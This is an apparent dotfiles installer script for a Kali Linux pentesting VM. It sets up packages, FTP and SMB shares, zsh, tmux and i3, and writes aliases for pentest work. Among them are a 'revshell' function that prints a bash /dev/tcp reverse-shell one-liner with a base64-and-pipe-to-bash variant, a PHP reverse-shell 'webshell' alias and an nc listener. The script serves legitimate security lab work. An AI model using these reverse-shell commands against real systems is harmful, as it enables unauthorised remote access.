#!/bin/bash
# Author: lefayjey
# last updated: 25/02/2026

RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
NC='\033[0m'

low_priv_user="kali"

# Resolve the directory where this script lives (handles symlinks and sourcing)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [ "$EUID" -ne 0 ]; then
    echo "Please run with sudo or as root"
    exit 1
fi

# ─── Helper ───────────────────────────────────────────────────────────────────

_copy_for_both() {
    # Usage: _copy_for_both <src> <dest_relative_to_home> [mode]
    local src="$1" dest="$2" mode="${3:-644}"

    # root
    local root_dest="/root/$dest"
    mkdir -p "$(dirname "$root_dest")"
    cp "$src" "$root_dest"
    chmod "$mode" "$root_dest"
    chown root:root "$root_dest"

    # low_priv_user
    local user_dest="/home/$low_priv_user/$dest"
    mkdir -p "$(dirname "$user_dest")"
    cp "$src" "$user_dest"
    chmod "$mode" "$user_dest"
    chown "$low_priv_user:$low_priv_user" "$user_dest"
}

# ─── Package installation ────────────────────────────────────────────────────

update_install() {
    echo -e "\n${BLUE}[Initiate]${NC} Install essential software\n"
    apt update && apt upgrade -y
    apt install -y \
        i3blocks rofi suckless-tools htop xcwd flameshot sshfs xclip \
        ghidra filezilla ntpsec-ntpdate rlwrap 2to3 gobuster eyewitness seclists krb5-user \
        tigervnc-viewer jadx gdb ltrace dos2unix curl wget git zsh \
        fonts-jetbrains-mono fonts-powerline \
        tmux cool-retro-term imagemagick \
        scrot acpi ifstat xdotool feh xautolock \
        i3lock-color
    echo -e "\n${GREEN}[Success]${NC} Install essential software\n"
}

# ─── FTP / SMB services ──────────────────────────────────────────────────────

install_ftp() {
    echo -e "\n${BLUE}[Initiate]${NC} Installing FTP\n"
    apt install -y pure-ftpd
    pure-pw useradd "$low_priv_user" -u "$low_priv_user" -d "/home/$low_priv_user/ftp" 2>/dev/null || true
    pure-pw mkdb
    ln -sf /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/60pdb
    mkdir -p "/home/$low_priv_user/ftp"
    chown -R "$low_priv_user:$low_priv_user" "/home/$low_priv_user/ftp"
    /etc/init.d/pure-ftpd restart
    echo -e "\n${GREEN}[Success]${NC} Installing FTP\n"
}

install_smb() {
    echo -e "\n${BLUE}[Initiate]${NC} Installing SMB\n"
    apt install -y samba
    if [ -f /etc/samba/smb.conf ] && [ ! -f /etc/samba/smb.conf.old ]; then
        mv /etc/samba/smb.conf /etc/samba/smb.conf.old
    fi
    cat > /etc/samba/smb.conf <<EOF
[share]
path = /home/$low_priv_user/smb
browseable = yes
read only = no
EOF
    smbpasswd -a "$low_priv_user"
    systemctl start smbd
    systemctl start nmbd
    mkdir -p "/home/$low_priv_user/smb"
    chown -R "$low_priv_user:$low_priv_user" "/home/$low_priv_user/smb"
    echo -e "\n${GREEN}[Success]${NC} Installing SMB\n"
}

# ─── Zsh + Oh-My-Zsh + Starship ──────────────────────────────────────────────

install_zsh() {
    echo -e "\n${BLUE}[Initiate]${NC} Modernize zsh terminal\n"

    # Install oh-my-zsh for low_priv_user
    if [ ! -d "/home/$low_priv_user/.oh-my-zsh" ]; then
        sudo -u "$low_priv_user" sh -c \
            'RUNZSH=no KEEP_ZSHRC=yes sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"'
    fi

    # Install oh-my-zsh for root
    if [ ! -d "/root/.oh-my-zsh" ]; then
        RUNZSH=no KEEP_ZSHRC=yes sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
    fi

    # Install zsh plugins for low_priv_user
    local user_custom="/home/$low_priv_user/.oh-my-zsh/custom"
    [ ! -d "$user_custom/plugins/zsh-autosuggestions" ] && \
        sudo -u "$low_priv_user" git clone https://github.com/zsh-users/zsh-autosuggestions "$user_custom/plugins/zsh-autosuggestions"
    [ ! -d "$user_custom/plugins/zsh-syntax-highlighting" ] && \
        sudo -u "$low_priv_user" git clone https://github.com/zsh-users/zsh-syntax-highlighting "$user_custom/plugins/zsh-syntax-highlighting"

    # Install zsh plugins for root
    local root_custom="/root/.oh-my-zsh/custom"
    [ ! -d "$root_custom/plugins/zsh-autosuggestions" ] && \
        git clone https://github.com/zsh-users/zsh-autosuggestions "$root_custom/plugins/zsh-autosuggestions"
    [ ! -d "$root_custom/plugins/zsh-syntax-highlighting" ] && \
        git clone https://github.com/zsh-users/zsh-syntax-highlighting "$root_custom/plugins/zsh-syntax-highlighting"

    # Install starship prompt
    if ! command -v starship &>/dev/null; then
        curl -sS https://starship.rs/install.sh | sh -s -- -y
    fi

    # Deploy starship config
    _copy_for_both "$SCRIPT_DIR/starship/starship.toml" ".config/starship.toml"

    echo -e "\n${GREEN}[Success]${NC} Modernize zsh terminal\n"
}

# ─── Tmux ─────────────────────────────────────────────────────────────────────

install_tmux() {
    echo -e "\n${BLUE}[Initiate]${NC} Install oh-my-tmux\n"

    # Install oh-my-tmux for low_priv_user
    if [ ! -d "/home/$low_priv_user/.tmux" ]; then
        sudo -u "$low_priv_user" git clone https://github.com/gpakosz/.tmux.git "/home/$low_priv_user/.tmux"
        sudo -u "$low_priv_user" ln -sf "/home/$low_priv_user/.tmux/.tmux.conf" "/home/$low_priv_user/.tmux.conf"
        sudo -u "$low_priv_user" cp "/home/$low_priv_user/.tmux/.tmux.conf.local" "/home/$low_priv_user/.tmux.conf.local"
    fi

    # Install oh-my-tmux for root
    if [ ! -d "/root/.tmux" ]; then
        git clone https://github.com/gpakosz/.tmux.git /root/.tmux
        ln -sf /root/.tmux/.tmux.conf /root/.tmux.conf
        cp /root/.tmux/.tmux.conf.local /root/.tmux.conf.local
    fi

    # Add pentest IP display to tmux status bar
    local tmux_snippet='
# -- pentest status bar (tun0 > eth0 IP) ------------------------------------
tmux_conf_theme_status_right_prefix="#{?#{==:#{pane_current_command},ssh},#[fg=yellow] ssh,} "
tmux_conf_theme_status_right=" #{?#{!=:#{b:pane_current_path},},#{b:pane_current_path},} | #(ip -4 addr show tun0 2>/dev/null | grep -oP "(?<=inet )\S+" | cut -d/ -f1 || ip -4 addr show eth0 2>/dev/null | grep -oP "(?<=inet )\S+" | cut -d/ -f1 || echo no-ip) | %R %d-%b"
'
    for conf in "/home/$low_priv_user/.tmux.conf.local" "/root/.tmux.conf.local"; do
        if [ -f "$conf" ] && ! grep -q "pentest status bar" "$conf" 2>/dev/null; then
            echo "$tmux_snippet" >> "$conf"
        fi
    done

    echo -e "\n${GREEN}[Success]${NC} Install oh-my-tmux\n"
}

# ─── Aliases & Zshrc ─────────────────────────────────────────────────────────

_write_aliases() {
    # Usage: _write_aliases <zshrc_path> <use_sudo>
    local zshrc="$1"
    local prefix="$2"  # "sudo " for low_priv_user, "" for root

    # Skip if aliases already present (idempotent)
    if grep -q "## Pentest aliases" "$zshrc" 2>/dev/null; then
        return 0
    fi

    cat >> "$zshrc" <<ALIASES

## Pentest aliases
alias www="python3 -m http.server 8000 --directory /opt/PentestTools/"
alias wwwhere="python3 -m http.server 8000"
alias smb="python3 \$(which smbserver.py) TOOLS /opt/PentestTools/ -smb2 -username username -password password"
alias smb_here="python3 \$(which smbserver.py) SHARE \$(pwd) -smb2 -username username -password password"
alias htb="${prefix}openvpn /opt/CTF/hackthebox/lab_cerebro11.ovpn"
alias thm="${prefix}openvpn /opt/CTF/tryhackme/cerebro11.ovpn"
alias vpnip="/sbin/ifconfig tun0 | grep 'inet ' | cut -d ' ' -f 10"
alias serv="sudo service apache2 start; sudo service smbd start; sudo service nmbd start; sudo service pure-ftpd start; sudo service ssh start"
alias dockershell="sudo docker run --rm -i -t --entrypoint=/bin/bash"
alias dockershellsh="sudo docker run --rm -i -t --entrypoint=/bin/sh"
alias clipboard="xclip -selection clipboard"

## Pro pentesting aliases
alias listener="sudo rlwrap nc -lvnp"
alias encode64="base64 -w0"
alias decode64="base64 -d"
alias urlencode="python3 -c 'import sys,urllib.parse as u;print(u.quote_plus(sys.argv[1]))'"
alias rdp="xfreerdp /dynamic-resolution +clipboard /cert-ignore /v:"
alias loot="mkdir -p loot/{credentials,hashes,screenshots,scans,misc}"
alias scope="cat scope.txt | sort -u | tee scope_sorted.txt"
alias webshell="cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php && echo '[*] Edit shell.php with your IP/port'"
alias pse="crackmapexec smb"
alias headers="curl -sI"
alias jqp="python3 -m json.tool"
alias ts="date +%Y%m%d_%H%M%S"

# Set/display current target IP (persists in env)
function target() {
    if [ -z "\$1" ]; then
        echo "\${TARGET:-not set}"
    else
        export TARGET="\$1"
        echo "[*] Target set to \$TARGET"
    fi
}

# Quick reverse shell one-liner generator
function revshell() {
    local ip="\${1:-\$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet )\S+' | cut -d/ -f1)}"
    local port="\${2:-443}"
    echo "bash -i >& /dev/tcp/\${ip}/\${port} 0>&1"
    echo "bash -i >& /dev/tcp/\${ip}/\${port} 0>&1" | base64 -w0
    echo ""
    echo "echo <base64> | base64 -d | bash"
}

function dockershellhere() {
    dirname=\${PWD##*/}
    sudo docker run --rm -it --entrypoint=/bin/bash -v "\$(pwd):/\${dirname}" -w "/\${dirname}" "\$@"
}

function dockershellshhere() {
    dirname=\${PWD##*/}
    sudo docker run --rm -it --entrypoint=/bin/sh -v "\$(pwd):/\${dirname}" -w "/\${dirname}" "\$@"
}
ALIASES
}

_configure_zshrc() {
    # Usage: _configure_zshrc <zshrc_path>
    local zshrc="$1"

    # Set oh-my-zsh plugins
    if grep -q "^plugins=" "$zshrc"; then
        sed -i 's/^plugins=.*/plugins=(git sudo zsh-autosuggestions zsh-syntax-highlighting)/' "$zshrc"
    else
        echo 'plugins=(git sudo zsh-autosuggestions zsh-syntax-highlighting)' >> "$zshrc"
    fi

    # Add starship init at the end if not already present
    if ! grep -q 'eval "$(starship init zsh)"' "$zshrc"; then
        cat >> "$zshrc" <<'STARSHIP'

# Starship prompt
eval "$(starship init zsh)"
STARSHIP
    fi

    # Add useful zsh options if not present
    if ! grep -q "HIST_IGNORE_DUPS" "$zshrc"; then
        cat >> "$zshrc" <<'ZSHOPTS'

# Modern zsh options
setopt HIST_IGNORE_DUPS
setopt HIST_IGNORE_SPACE
setopt SHARE_HISTORY
setopt AUTO_CD
setopt CORRECT
HISTSIZE=50000
SAVEHIST=50000
ZSHOPTS
    fi

    # Load Xresources for terminal colors
    if ! grep -q "xrdb" "$zshrc"; then
        cat >> "$zshrc" <<'XRDB'

# Load terminal color scheme
[[ -f ~/.Xresources ]] && command -v xrdb &>/dev/null && xrdb -merge ~/.Xresources
XRDB
    fi
}

create_aliases() {
    echo -e "\n${BLUE}[Initiate]${NC} Configuring aliases and zsh\n"

    # Prepare VM mounting script
    cat > /usr/local/sbin/vm-mount <<'EOF'
#!/bin/bash
setxkbmap ch
cp /usr/share/zoneinfo/Europe/Zurich /etc/localtime
w > /dev/null
date

systemctl stop run-vmblock-fuse.mount 2>/dev/null
killall -q -w vmtoolsd 2>/dev/null
systemctl start run-vmblock-fuse.mount 2>/dev/null
systemctl enable run-vmblock-fuse.mount 2>/dev/null
vmware-user-suid-wrapper vmtoolsd -n vmusr 2>/dev/null
vmtoolsd -b /var/run/vmroot 2>/dev/null

vmware-hgfsclient | while read -r folder; do
    vmwpath="/mnt/hgfs/${folder}"
    echo "[i] Mounting ${folder}   (${vmwpath})"
    sudo mkdir -p "${vmwpath}"
    sudo umount -f "${vmwpath}" 2>/dev/null
    sudo vmhgfs-fuse -o allow_other -o auto_unmount ".host:/${folder}" "${vmwpath}"
done
sleep 2s

for i in /mnt/hgfs/$(vmware-hgfsclient)/*/; do
    ln -s "$i" /opt 2>/dev/null
done
EOF
    chmod +x /usr/local/sbin/vm-mount

    # Create systemd sleep hook to re-run vm-mount on VM resume
    # vm-mount already handles: setxkbmap ch, timezone, VMware shared folders
    cat > /lib/systemd/system-sleep/99-kali-resume.sh <<'SLEEPHOOK'
#!/bin/bash
# Re-apply keyboard layout, timezone, and remount shared folders after VM suspend/resume
case "$1" in
    post)
        sleep 2
        # Re-run vm-mount (handles setxkbmap ch + timezone + shared folders)
        /usr/local/sbin/vm-mount &
        # Also re-apply keyboard layout for every active X display (belt & suspenders)
        for disp in /tmp/.X11-unix/X*; do
            disp_num="${disp##*X}"
            export DISPLAY=":${disp_num}"
            user=$(who | grep "(:${disp_num})" | head -1 | awk '{print $1}')
            if [ -n "$user" ]; then
                su - "$user" -c "DISPLAY=:${disp_num} setxkbmap ch" 2>/dev/null
            fi
            setxkbmap ch 2>/dev/null
        done
        ;;
esac
SLEEPHOOK
    chmod +x /lib/systemd/system-sleep/99-kali-resume.sh

    # Write aliases for low_priv_user and root
    _write_aliases "/home/$low_priv_user/.zshrc" "sudo "
    _write_aliases "/root/.zshrc" ""

    # Configure zshrc with plugins and starship
    _configure_zshrc "/home/$low_priv_user/.zshrc"
    _configure_zshrc "/root/.zshrc"

    echo -e "\n${GREEN}[Success]${NC} Configuring aliases and zsh\n"
}

# ─── i3 / Rofi / Picom / Lock screen config files ────────────────────────────

copy_i3_config_files() {
    echo -e "\n${BLUE}[Initiate]${NC} Copying i3 config files\n"

    # ── i3 config + i3blocks ──
    _copy_for_both "$SCRIPT_DIR/i3/config" ".config/i3/config"
    _copy_for_both "$SCRIPT_DIR/i3/i3blocks.conf" ".config/i3/i3blocks.conf"

    # Apply dos2unix to i3 configs
    dos2unix /root/.config/i3/config /root/.config/i3/i3blocks.conf 2>/dev/null
    dos2unix "/home/$low_priv_user/.config/i3/config" "/home/$low_priv_user/.config/i3/i3blocks.conf" 2>/dev/null

    # ── Lock screen script ──
    cp "$SCRIPT_DIR/scripts/lock_screen.sh" /usr/bin/lock_screen.sh
    chmod +x /usr/bin/lock_screen.sh
    dos2unix /usr/bin/lock_screen.sh 2>/dev/null

    # ── Rofi config ──
    _copy_for_both "$SCRIPT_DIR/rofi/config.rasi" ".config/rofi/config.rasi"

    # ── Terminal color scheme (Xresources) ──
    _copy_for_both "$SCRIPT_DIR/Xresources" ".Xresources"

    # ── Qterminal color scheme ──
    _copy_for_both "$SCRIPT_DIR/qterminal/kali.colorscheme" ".config/qterminal.org/color-schemes/kali.colorscheme"

    echo -e "\n${GREEN}[Success]${NC} Copying config files\n"
}

# ─── Run ──────────────────────────────────────────────────────────────────────

main() {
    echo -e "\n${BLUE}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}  lefayjey dot-files installer${NC}"
    echo -e "${BLUE}══════════════════════════════════════════════════════════════${NC}\n"

    update_install       || { echo -e "\n\n${RED}[Failure]${NC} Installation of essential software failed.. exiting script!\n"; exit 1; }
    install_ftp          || { echo -e "\n\n${RED}[Failure]${NC} FTP install failed.. exiting script!\n"; exit 1; }
    install_smb          || { echo -e "\n\n${RED}[Failure]${NC} SMB install failed.. exiting script!\n"; exit 1; }
    install_zsh          || { echo -e "\n\n${RED}[Failure]${NC} Zsh modernization failed.. exiting script!\n"; exit 1; }
    install_tmux         || { echo -e "\n\n${RED}[Failure]${NC} Tmux install failed.. exiting script!\n"; exit 1; }
    create_aliases       || { echo -e "\n\n${RED}[Failure]${NC} Creating aliases failed.. exiting script!\n"; exit 1; }
    copy_i3_config_files || { echo -e "\n\n${RED}[Failure]${NC} i3 config files copy failed.. exiting script!\n"; exit 1; }

    echo -e "\n${GREEN}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}  All done! Reload i3 with \$mod+Shift+r${NC}"
    echo -e "${GREEN}══════════════════════════════════════════════════════════════${NC}\n"
}

main "$@"